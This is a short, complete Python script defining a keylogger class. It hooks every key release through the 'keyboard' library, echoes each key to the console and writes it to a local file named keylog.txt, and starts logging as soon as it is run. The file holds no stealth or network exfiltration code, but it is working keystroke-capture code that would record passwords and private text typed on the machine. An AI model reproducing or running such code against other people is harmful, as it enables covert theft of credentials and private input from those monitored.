import keyboard 

class Keylogger():
    def __init__(self, log_filename):
        try:
            self.f = open(log_filename, "w")
        except OSError as e:
            print(f"Failed to open log file '{log_filename}': {e}")
            raise
    
    def start_log(self):
        try:
            keyboard.on_release(callback=self.callback)
            keyboard.wait()
        finally:
            self.f.close()

    def callback(self, event):
        button = event.name
        if button == "space":
            button = " "
        if button == "enter":
            button = "\n"
        print(button)
        try:
            self.f.write(button)
            self.f.flush()
        except OSError as e:
            print(f"Failed to write to log file: {e}")

keylogger_object = Keylogger("keylog.txt")
keylogger_object.start_log()

